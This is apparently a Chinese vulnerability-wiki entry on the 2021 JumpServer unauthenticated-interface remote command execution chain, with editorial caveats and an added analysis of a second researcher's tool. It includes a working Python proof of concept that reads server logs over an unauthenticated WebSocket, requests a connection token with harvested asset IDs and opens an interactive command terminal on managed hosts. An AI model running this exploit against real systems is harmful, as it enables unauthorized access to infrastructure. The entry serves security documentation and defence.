---
source: "MrWQ/vulnerability-paper"
title: "JumpServer 未授权接口 远程命令执行漏洞"
product: "JumpServer core/Koko"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "历史材料所列分支范围仍待逐分支核对；本补充依据作者 v2.6.1 实验：已配置资产及系统用户、日志路径已知、历史终端记录含有效 user/asset/system_user 标识；自动登录或仍可复用的资产会话影响连接结果"
source_url: "https://mp.weixin.qq.com/s/5q4cSlHUQ3NejkRg3vOWUA"
source_status: "recorded"
side_effects: "读取并在控制台输出日志和资产标识；申请连接令牌、建立受管资产终端并产生可能的审计记录；所附固定工具在 Yes/No 提示前向所有候选发送 echo 命令；后续命令的文件、账号或其他影响取决于输入；持续读取和无显式等待上限可能占用资源"
id: "vw-a962bc76d2301a2c718e6fc2"
entity_id: "ve-a962bc76d2301a2c718e6fc2"
schema_version: "1"
canonical: "Web安全/运维面板/Jumpserver/JumpServer 未授权接口 远程命令执行漏洞.md"
previous_prerequisites: "Branch-specific vulnerable builds (<2.6.2,<2.5.4,<2.4.5,1.5.9 stated); logs expose user/asset/system_user IDs; configured asset"
previous_side_effects: "含资源消耗、延时或崩溃验证：可能影响服务可用性；限制请求次数、并发与超时，保留无攻击负载的对照结果。"
version: "补充来源仅记录 JumpServer v2.6.1 实验环境；不是完整受影响范围，前文历史分支声明仍待核"
fixed_version: "unknown"
verification_source: "补充来源文本核对：https://mp.weixin.qq.com/s/lbcYzNsiOYZRwQzAIYxg3g；对应历史快照：https://web.archive.org/web/20210315060223id_/https://mp.weixin.qq.com/s/lbcYzNsiOYZRwQzAIYxg3g；工具静态核对：https://github.com/Veraxy00/Jumpserver-EXP/blob/4ce1723c2eb4f08fd42447ecdaeec5b1cab180b2/jumpserver-exp.py；不替换主来源，不表示运行验证"
---

# JumpServer 未授权接口 远程命令执行漏洞

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：Branch-specific vulnerable builds (<2.6.2,<2.5.4,<2.4.5,1.5.9 stated); logs expose user/asset/system_user IDs; configured asset
- 证据范围：Log-read/token/WebSocket terminal chain with code and difficulty caveat; command execution on managed assets not necessarily core service

### 本次正文校订

- 按实际内容修正 3 处代码围栏语言标记，保留其中方法与请求内容。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- Version comparisons need branch bounds; as flat OR ranges falsely include fixed2.4/2.5 builds
- POC incorrectly treats401/403/404 response as proof unpatched and other responses as patched
- str.strip('http://') is character stripping, not URL prefix removal; https/wss unsupported as written
- Hardcoded UUIDs and magic message counts are lab-specific
- Execution scope should distinguish asset session privileges from JumpServer host RCE
- Preserve admission that required IDs often absent from logs

### 操作风险与资料使用

- 含资源消耗、延时或崩溃验证：可能影响服务可用性；限制请求次数、并发与超时，保留无攻击负载的对照结果。

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/5q4cSlHUQ3NejkRg3vOWUA)

**点击蓝字**

![](../../.resource/remote/e196a44ab5c0c266d1799efc1e3868a880e0d09347a592a09e40339238fdbd85.gif)

**关注我们**

  

**_声明  
_**

本文作者：PeiQi  
本文字数：2839

阅读时长：15min

附件 / 链接：点击查看原文下载

声明：请勿用作违法用途，否则后果自负

本文属于 WgpSec 原创奖励计划，未经许可禁止转载

  

  

**_前言_**

  

![](../../.resource/remote/d3ae686d3673e1c59bddb826d595e3acd083a0f09385b5c80594ac77f2bc1736.gif)

一、

漏洞描述
----

JumpServer 是全球首款完全开源的堡垒机, 使用 GNU GPL v2.0 开源协议, 是符合 4A 的专业运维审计系统。JumpServer 使用 Python / Django 进行开发。2021 年 1 月 15 日，阿里云应急响应中心监控到开源堡垒机 JumpServer 发布更新，修复了一处远程命令执行漏洞。由于 JumpServer 某些接口未做授权限制，攻击者可构造恶意请求获取到日志文件获取敏感信息，或者执行相关 API 操作控制其中所有机器。  

二、

漏洞影响
----

JumpServer < v2.6.2

JumpServer < v2.5.4

JumpServer < v2.4.5

JumpServer = v1.5.9

**三、**

漏洞复现
----

进入后台添加配置

**资产管理 -->  系统用户**

![](../../.resource/remote/bd9449c1560dfa5601fdbf797b9789d3ae05674caae5772d0a0816728cb48407.png)

**资产管理 --> 管理用户**

![](../../.resource/remote/b019c8d60465f2c3115193693d5a3c21ce59a396dbd4d0899f36d7b5325bafd3.png)

**用户管理 --> 用户列表**

![](../../.resource/remote/02ad8949edfe9aa6cd502b3cfcb8d577651c49b7b14b1f6141f03cfe84d42749.png)

**资产管理 --> 资产列表**

![](../../.resource/remote/c591cfa8b919118ee7a37d0d657aadd3a483c166efb08c4e93acdfaa081034a8.png)

查看一下项目代码提交变动

![](../../.resource/remote/ff6acf4ec223b1b44fab446ded30edd19fcf2b6c1ee02cc6598c6f7d7e0854bf.png)

```python
import time
import os
import threading
import json

from common.utils import get_logger

from .celery.utils import get_celery_task_log_path
from channels.generic.websocket import JsonWebsocketConsumer

logger = get_logger(__name__)


class CeleryLogWebsocket(JsonWebsocketConsumer):
    disconnected = False

    def connect(self):
        user = self.scope["user"]
        if user.is_authenticated and user.is_org_admin:
            self.accept()
        else:
            self.close()

    def receive(self, text_data=None, bytes_data=None, **kwargs):
        data = json.loads(text_data)
        task_id = data.get("task")
        if task_id:
            self.handle_task(task_id)

    def wait_util_log_path_exist(self, task_id):
        log_path = get_celery_task_log_path(task_id)
        while not self.disconnected:
            if not os.path.exists(log_path):
                self.send_json({'message': '.', 'task': task_id})
                time.sleep(0.5)
                continue
            self.send_json({'message': '\r\n'})
            try:
                logger.debug('Task log path: {}'.format(log_path))
                task_log_f = open(log_path, 'rb')
                return task_log_f
            except OSError:
                return None

    def read_log_file(self, task_id):
        task_log_f = self.wait_util_log_path_exist(task_id)
        if not task_log_f:
            logger.debug('Task log file is None: {}'.format(task_id))
            return

        task_end_mark = []
        while not self.disconnected:
            data = task_log_f.read(4096)
            if data:
                data = data.replace(b'\n', b'\r\n')
                self.send_json(
                    {'message': data.decode(errors='ignore'), 'task': task_id}
                )
                if data.find(b'succeeded in') != -1:
                    task_end_mark.append(1)
                if data.find(bytes(task_id, 'utf8')) != -1:
                    task_end_mark.append(1)
            elif len(task_end_mark) == 2:
                logger.debug('Task log end: {}'.format(task_id))
                break
            time.sleep(0.2)
        task_log_f.close()

    def handle_task(self, task_id):
        logger.info("Task id: {}".format(task_id))
        thread = threading.Thread(target=self.read_log_file, args=(task_id,))
        thread.start()

    def disconnect(self, close_code):
        self.disconnected = True
        self.close()
```

新版对用户进行了一个判断，可以使用 谷歌插件 WebSocket King 连接上这个 websocket 进行日志读取

![](../../.resource/remote/144e2def60a956389ba45121bc25e51d5b3f50f038e12f032920f3784a5ef73c.png)

比如 send 这里获取的 Task id , 这里是可以获得一些敏感的信息的

![](../../.resource/remote/ecceca118f8a2104319159e71a91b8604a7523b87ea86d9891478a370a690ad5.png)

查看一下连接 Web 终端的后端 api 代码

![](../../.resource/remote/8ff76a6f48f4580e5991f2dd8c84a9f4d952100a25f596b1cdf7bca636b41c22.png)

可以看到这里调用时必须需要 **user asset system_user** 这三个值，再获取一个 20 秒的 **token**

访问 web 终端后查看日志的调用

![](../../.resource/remote/6d27911d921b8f84af4046e51ae41824d1cee01f15c617ad6f36ff8e234be0a9.png)

```shell
docker exec -it (jumpserve/core的docker) /bin/bash
cat gunicorn.log | grep /api/v1/perms/asset-permissions/user/validate/?
```

![](../../.resource/remote/03bee517eec3bb1eabb5e8cda35b68104aae1df0985f97ec28121e8b2292aebe.png)

```
assset_id=ee7e7446-6df7-4f60-b551-40a241958451
system_user_id=d89bd097-b7e7-4616-9422-766c6e4fcdb8  
user_id=efede3f4-8659-4daa-8e95-9a841dbe82a8
```

可以看到在不同的时间访问这个接口的 asset_id 等都是一样的，所以只用在 **刚刚的未授权日志读取**里找到想要的这几个值就可以获得 token

![](../../.resource/remote/ef5847da74028a1cd2b9d03ad23968a50451aa3d2329a2956fdf33cba285fa59.png)

试过了很多，部分可获取，大部分日志中很难找到这些值，利用难度还是挺高的

![](../../.resource/remote/371f3c944bb19f53c33487a431b0b8ae5b1aee1da22bbcf0ec3cdf1a8e0acc6c.png)

看一下 koko.js 这个前端文件

![](../../.resource/remote/2b252e507dfec7202314ca2a7e076aad368502deea2d5d9e874583695d904c7b.png)

后端代码 https://github.com/jumpserver/koko/blob/e054394ffd13ac7c71a4ac980340749d9548f5e1/pkg/httpd/webserver.go

![](../../.resource/remote/4536cf4e9f65fee69a63006a37eb0585ef6b5b13af6553b8b07d893f0321e855.png)

这里我们就可以通过 获得的 token 来模拟请求

![](../../.resource/remote/fc6fb590cfc9e8dcd5939312c62c5927d7baa8e37ebce5a3de0813638bdd87f6.png)

成功连接模拟了这个 token 的请求, 可以在 Network 看一下流量是怎么发送的

![](../../.resource/remote/ae86942e92d0d29da1ef21a6fd7665241711df6293da6ae4522014e5e536761e.png)

模拟连接发送和接发数据

![](../../.resource/remote/043d7dae0ef91f690a8f512e541975bd4d1e66849f106064a17c0f732e39aef9.png)

这里可以看到我们只要模拟了这个发送，返回的数据和 web 终端是一样的，那我们就可以通过这样的方法来进行命令执行了

漏洞利用 POC
--------

```
POC 里包含两个方法，一个是获取日志文件，另一个是命令执行

命令执行需要从日志中获取敏感数据并写入脚本对应的变量中 (这个感觉利用难度比较高吧，很多找不到这个数据)

接收数据如果卡住请调整 for i in range(7) 这个位置的 7
```

```python
import requests
import json
import sys
import time
import asyncio
import websockets
import re
from ws4py.client.threadedclient import WebSocketClient

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mPOC_Des: https://www.o2oxy.cn/                                    \033[0m')
    print('+  \033[34mVersion: JumpServer <= v2.6.1                                     \033[0m')
    print('+  \033[36m使用格式: python3 poc.py                                           \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                            \033[0m')
    print('+  \033[36mCmd         >>> whoami                                    \033[0m')
    print('+------------------------------------------')

class ws_long(WebSocketClient):

    def opened(self):
        req = '{"task":"/opt/jumpserver/logs/jumpserver"}'
        self.send(req)

    def closed(self, code, reason=None):
        print("Closed down:", code, reason)

    def received_message(self, resp):
        resp = json.loads(str(resp))
        # print(resp)
        data = resp['message']
        if "File" in data:
            data = ""
        print(data)


async def send_msg(websocket, _text):
    if _text == "exit":
        print(f'you have enter "exit", goodbye')
        await websocket.close(reason="user exit")
        return False
    await websocket.send(_text)
    recv_text = await websocket.recv()
    print(re.findall(r'"data":"(.*?)"', recv_text))


async def main_logic(target_url):
    print("\033[32m[o] 正在连接目标: {}\033[0m".format(target_url))
    async with websockets.connect(target_url) as websocket:
        recv_text = await websocket.recv()
        resws = json.loads(recv_text)
        id = resws['id']
        print("\033[36m[o] 成功获取 ID: {}\033[0m".format(id))

        inittext = json.dumps({"id": id, "type": "TERMINAL_INIT", "data": "{\"cols\":164,\"rows\":17}"})
        await send_msg(websocket, inittext)
        for i in range(7):
            recv_text = await websocket.recv()
            print(re.findall(r'"data":"(.*?)"', recv_text))

        while True:
            cmd = str(input("\033[35mcmd  >>> \033[0m"))
            cmdtext = json.dumps({"id": id, "type": "TERMINAL_DATA", "data": cmd + "\r\n"})
            await send_msg(websocket, cmdtext)
            for i in range(1):
                recv_text = await websocket.recv()
                print(re.findall(r'"data":"(.*?)"', recv_text))


def POC_1(target_url):
    vuln_url = target_url + "/api/v1/users/connection-token/?user-only=1"
    response = requests.get(url=vuln_url, timeout=5)
    if response.status_code == 401 or response.status_code == 403 or response.status_code == 404:
        print("\033[32m[o] 目标 {} JumpServer堡垒机为未修复漏洞版本，请通过日志获取关键参数\033[0m".format(target_url))
        ws_open = str(input("\033[32m[o] 是否想要提取日志（Y/N） >>> \033[0m"))
        if ws_open == "Y" or ws_open == "y":
            ws = target_url.strip("http://")
            try:
                ws = ws_long('ws://{}/ws/ops/tasks/log/'.format(ws))
                ws.connect()
                ws.run_forever()
                ws.close()
            except KeyboardInterrupt:
                ws.close()
    else:
        print("\033[31m[x] 目标漏洞已修复，无法获取敏感日志信息\033[0m")
        sys.exit(0)


def POC_2(target_url, user, asset, system_user):
    if target_url == "" or asset == "" or system_user == "":
        print("\033[31m[x] 请获取 assset 等参数配置\033[0m")
        sys.exit(0)
    data = {"user": user, "asset": asset, "system_user": system_user}
    vuln_url = target_url + "/api/v1/users/connection-token/?user-only=1"
    # vuln_url = target_url + "/api/v1/authentication/connection-token/?user-only=1"

    try:
        response = requests.post(vuln_url, json=data, timeout=5).json()
        print("\033[32m[o] 正在请求：{}\033[0m".format(vuln_url))
        token = response['token']
        print("\033[36m[o] 成功获取Token：{}\033[0m".format(token))
        ws_url = target_url.strip("http://")
        ws_url = "ws://" + ws_url + "/koko/ws/token/?target_id={}".format(token)
        asyncio.get_event_loop().run_until_complete(main_logic(ws_url))

    except Exception as e:
        print("\033[31m[x] 请检查 assset 等参数配置,{}\033[0m".format(e))
        sys.exit(0)


if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl   >>> \033[0m"))
    user = "7c30bef8-61e2-4644-bf90-f7cacd1936f8"
    asset = "2bb3df36-8e63-4ace-9f8f-c77e95ffc549"
    system_user = "abd00340-e9ba-40af-a432-9a85f867b6bb"
    POC_1(target_url)
    POC_2(target_url, user, asset, system_user)
```

![](../../.resource/remote/326f1b75072e60122a36134474a994eb6e5c43cdf639c1828febb913ad5cd52d.png)

![](../../.resource/remote/bd18eecd1d4ce644c26c7d5d897a9326689e6324eb1b3360e351116856ad0a9b.png)

![](../../.resource/remote/c2a11e0c8f923167a4984506825fc64b55fe796c0631a2ba2692d99b83580b29.png)

  

  

**_扫描关注公众号回复加群_**

**_和师傅们一起讨论研究~_**

  

**长**

**按**

**关**

**注**

**WgpSec 狼组安全团队**

微信号：wgpsec

Twitter：@wgpsec

![](../../.resource/remote/b9e1284285c5071573cdab2007195e695eb9d397834bf8ada6d0ffc6fb61d537.jpg)

![](../../.resource/remote/bd8c348cdec726a3436db5005b7a9fce34d12de57cac8d2d94ac31a1c423b221.gif)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）

## 补充：Veraxy 对日志、认证与资产会话条件的分析

### 来源与阅读范围

本节依据 Veraxy @ QAX CERT 的《[JumpServer远程命令执行你可能不知道的点（附利用工具）](https://mp.weixin.qq.com/s/lbcYzNsiOYZRwQzAIYxg3g)》整理。原文页面记录的发布时间为 2021 年 2 月 9 日；本次读取的是 [2021 年 3 月 15 日保存的原文历史快照](https://web.archive.org/web/20210315060223id_/https://mp.weixin.qq.com/s/lbcYzNsiOYZRwQzAIYxg3g)，不是本次可直接访问的微信页面。前文保留的 PeiQi 材料与本节为不同来源。

原作者使用的实验环境为 JumpServer v2.6.1。本节补充原文对资产登录方式、日志前提、接口认证和工具行为的说明；没有据此扩展其他分支的受影响版本，也没有在本次整理中执行请求、脚本或复现操作。原文的 67 个图片引用已登记，本节的判断依据为已读正文和下列固定工具源码，不把未查看的截图当作成功复现证据。

这里的命令执行依赖 JumpServer 管理的资产连接，权限随对应系统用户和资产会话而定。不能由“可以建立资产终端”直接推出已经获得 JumpServer 核心服务所在主机或所有资产的 root 权限。

### 一、资产登录方式决定会话能否建立

原文首先区分了管理用户和系统用户：管理用户用于管理资产、推送系统用户、获取资产信息等；系统用户则是 JumpServer 跳转登录资产时使用的账户。配置了资产和用户关系，不等于任意时刻都能建立一个新的资产会话。

原作者在 v2.6.1 实验环境中分别观察了以下情况：

1. **自动登录。** 系统用户被配置为自动登录时，JumpServer 可以使用预留的认证信息连接资产。原文记录，在中断原有会话后仍能重新连接并执行命令；作者据此将自动登录作为稳定复现的重要条件。部分配置还涉及把系统用户自动推送至资产。
2. **手动登录。** 如果连接资产时需要再次输入密码，攻击者仅取得接口返回的连接令牌，并不意味着掌握资产登录密码。原文描述了一种有限情况：系统用户与资产之间仍有未中断的 SSH 会话时，可能借助既有会话复用完成连接。
3. **已有会话结束后。** 在上述手动登录场景中，原作者退出已有会话后再次测试，系统要求重新输入密码；不能再沿用此前的连接结果判断后续请求一定成功。

这些是原作者的实验记录和条件分析。本节不将“实际部署通常采用自动登录”之类普遍性判断作为已验证事实，也不把手动登录等同于所有版本、所有配置下均安全。

### 二、日志读取还需要路径、内容和历史记录同时满足

前文已保留日志读取到终端连接的基本链条。原文进一步解释了几个容易忽略的前提：

- **日志接口路径与日志文件路径是两层概念。** WebSocket 接口为 `/ws/ops/tasks/log/`；发送给它的 `task` 值才用于确定要读取的日志文件。原文选择的是 `/opt/jumpserver/logs/gunicorn`，而不是把接口 URL 当作磁盘文件路径。
- **原文分析的路径处理会补上 `.log`。** 因此其例子在 `task` 值中省略了后缀。作者同时指出，这种处理限制了该入口可以直接读取的文件类型，不能把它概括成任意扩展名文件读取。
- **必须能从已有记录取得有效标识。** 原文使用用户、资产和系统用户的三个标识，来源是 Web Terminal 连接资产时留下的权限校验记录。系统用户从未通过该方式连接过目标资产，或日志中没有相应记录时，正文中的后续步骤缺少必要输入。
- **历史记录不保证仍可使用。** 日志中出现过某组三个标识，不能证明对应资产仍存在、仍可达，或者当前配置仍允许创建会话。原文附带工具把日志提取与资产可用性检查分成不同阶段。
- **实际日志位置仍须吻合。** 作者使用的是默认日志目录。目录被调整、文件缺失或内容不符合预期，都可能使该样例无法取得所需数据；这类失败不能单独当作漏洞已经修复的证据。

原文将日志调用关系梳理为 `CeleryLogWebsocket.receive()` 接收 `task`，随后经过 `handle_task()`、`read_log_file()`、`wait_util_log_path_exist()` 与 `get_celery_task_log_path()` 处理。这里保留的是原作者的代码分析结论；本轮没有重新审计整个 JumpServer 代码库。

### 三、同名参数在两个终端入口中并非同一含义

原文区分了 `/koko/ws/terminal/` 与 `/koko/ws/token/`：

- `/koko/ws/terminal/` 是正常 Web Terminal 使用的入口。原文解释，该入口中的 `target_id` 对应资产标识，并与 `type`、`system_user_id` 等参数共同使用；会话需要经过相应的身份检查。
- `/koko/ws/token/` 中的 `target_id` 对应连接令牌。原文描述，此入口根据令牌取得资产连接所需信息，再建立终端会话。

因此，不能因为参数都叫 `target_id`，就把正常资产入口中的资产标识直接视为令牌入口所需的值。原文将连接令牌的有效期描述为 20 秒，并分别讨论了取得令牌和在有效期内建立终端会话两个环节。

关于 `/api/v1/authentication/connection-token/` 与 `/api/v1/users/connection-token/`，原文认为它们在该实验版本中采用相同处理类，并介绍了 `user-only` 参数与权限选择之间的关系。需要保留一处原文内部的不一致：在介绍 Luna 的 `http.ts` 时，作者称非空 `user-only` 用于取得全部用户信息；后面分析 `GetTokenAsset()` 时，又称只有 `token` 返回全部信息，同时携带 `user-only` 时返回 `user` 字段。本节不把这两种相反表述合并成一个已核实结论，也没有据此改写原始请求或推导新的利用方法。进一步确定字段级语义，需要针对对应版本的处理函数另行核对。

### 四、原作者所附工具的实际流程与副作用

原文附带工具为 [Veraxy00/Jumpserver-EXP](https://github.com/Veraxy00/Jumpserver-EXP)。本次静态阅读固定在提交 `4ce1723c2eb4f08fd42447ecdaeec5b1cab180b2`：

- [README.md](https://github.com/Veraxy00/Jumpserver-EXP/blob/4ce1723c2eb4f08fd42447ecdaeec5b1cab180b2/README.md)
- [jumpserver-exp.py](https://github.com/Veraxy00/Jumpserver-EXP/blob/4ce1723c2eb4f08fd42447ecdaeec5b1cab180b2/jumpserver-exp.py)

该提交的 Python 入口共 129 行、5,599 字节，已完整阅读。仓库根目录另外包含 README 和四个演示图片文件，没有其他本地代码模块、依赖清单、锁定文件、安装脚本或工作流目录。入口直接导入的第三方库为 `requests`、`websockets`，其余导入为 Python 标准库。README 只说明使用 Python 3，并给出以下调用形式，没有给出可复现的依赖版本组合或完整安装过程：

```text
python jumpserver-exp.py [address]

如：python jumpserver-exp.py http://192.168.18.182:8080
```

上面的地址是原 README 的历史实验示例。本次没有运行该命令。

从固定源码可以区分出三个阶段：

1. **读取和提取。** 入口连接日志 WebSocket，提交固定的 `task` 文件路径，把收到的日志片段累积到内存，并用固定格式的正则表达式提取三元组。它依赖特定的参数顺序和日志格式，还以匹配到的健康检查日志作为结束条件（[源码第 13—32 行](https://github.com/Veraxy00/Jumpserver-EXP/blob/4ce1723c2eb4f08fd42447ecdaeec5b1cab180b2/jumpserver-exp.py#L13-L32)）。
2. **逐项检查。** 对提取出的每个候选，脚本取得连接令牌并尝试建立终端，然后发送预设的 `echo` 标记命令来判断返回结果。这个阶段已经会向资产终端发送命令，不只是读取列表或测试 TCP 端口（[令牌及检测函数，第 45—67 行](https://github.com/Veraxy00/Jumpserver-EXP/blob/4ce1723c2eb4f08fd42447ecdaeec5b1cab180b2/jumpserver-exp.py#L45-L67)；[遍历候选，第 99—104 行](https://github.com/Veraxy00/Jumpserver-EXP/blob/4ce1723c2eb4f08fd42447ecdaeec5b1cab180b2/jumpserver-exp.py#L99-L104)）。
3. **选择资产并执行用户命令。** 完成前面的逐项检查后，脚本才询问是否继续，再读取资产编号和用户指定的命令（[第 111—129 行](https://github.com/Veraxy00/Jumpserver-EXP/blob/4ce1723c2eb4f08fd42447ecdaeec5b1cab180b2/jumpserver-exp.py#L111-L129)）。

**脚本中的 Yes/No 提示出现在逐项检查之后。** 因此选择 No 只能阻止后续的人工指定命令阶段，不能撤回此前已经进行的日志读取、令牌请求、终端初始化和预设 `echo` 命令。使用该脚本前就需要明确覆盖这些动作的资产授权。

源码会把日志中的标识、终端返回内容和后续取得的令牌打印到控制台；终端会话及命令也可能被资产或 JumpServer 的审计机制记录。脚本本身没有直接创建本地结果文件、新增账号或删除文件的调用，但用户在最后阶段输入的命令可以产生相应副作用，不能因工具名带有“检测”而将它视为只读操作。

### 五、固定工具与原文样例的保真限制

以下问题来自静态阅读，不是一次执行结果，也没有在整理过程中修补为新工具：

- 固定工具没有为 `requests.post()` 指定超时或先检查 HTTP 状态，便直接解析 JSON 和读取 `token` 字段；逐条 `recv()` 也没有显式的单次等待上限。捕获 `TimeoutError` 本身不会新增计时限制。日志片段会持续累积到内存，读取流程依赖其结束标记；消息数量或输出格式不符时，流程可能停滞、占用更多内存或判断不准确。
- 工具的“可用”判断要求特定标记在一次返回中出现指定次数。终端回显、消息分片和提示内容都会影响这一判断；未被列为可用资产不能直接推出目标不存在漏洞。
- 日志 URL 构造处理了 `http`/`https` 到 `ws`/`wss` 的转换，但后续终端 URL 仍使用固定 `ws://` 拼接方式。不能据此宣称这个版本完整支持 HTTPS 部署。
- 资产选择的边界检查使用了原始候选集合的长度，随后却按筛选后的集合取值；筛选前后数量不同或编号输入不合适时可能出现错误。原代码未改。
- 原文内嵌的简短 Python 样例与仓库完整工具不是同一个文件。保存的原始 HTML 中，该简短样例的最后一个代码行元素为 `asyncio.get_event_loop().run_until_complete(main_logic(cmd)`，缺少外层闭合括号。这里照录该行，不补写括号。
- 原文按多个 `<code>` 元素保存代码行。单靠正文文本提取无法可靠还原显示缩进，本次也没有重建页面样式；不能只凭提取文本没有缩进，就把排版丢失判定为原作者源文件的缩进错误。原始 HTML 已保留。
- 第三方依赖没有固定版本，本轮未下载或审计依赖包实现；没有建立运行环境或验证截图。这个缺口影响“原样可运行”和运行结果的判断，不影响对已读正文、入口代码和上述方法条件的整理。

### 补充来源

- Veraxy @ QAX CERT：[JumpServer远程命令执行你可能不知道的点（附利用工具）](https://mp.weixin.qq.com/s/lbcYzNsiOYZRwQzAIYxg3g)
- 原文历史快照：[20210315060223](https://web.archive.org/web/20210315060223id_/https://mp.weixin.qq.com/s/lbcYzNsiOYZRwQzAIYxg3g)
- 原作者附带工具：[固定提交 4ce1723c2eb4f08fd42447ecdaeec5b1cab180b2](https://github.com/Veraxy00/Jumpserver-EXP/tree/4ce1723c2eb4f08fd42447ecdaeec5b1cab180b2)

本节未新增 CVE 编号。原文关于部分版本认证方式不同的提醒予以保留，但没有足够证据据此重写前文的完整受影响分支列表。
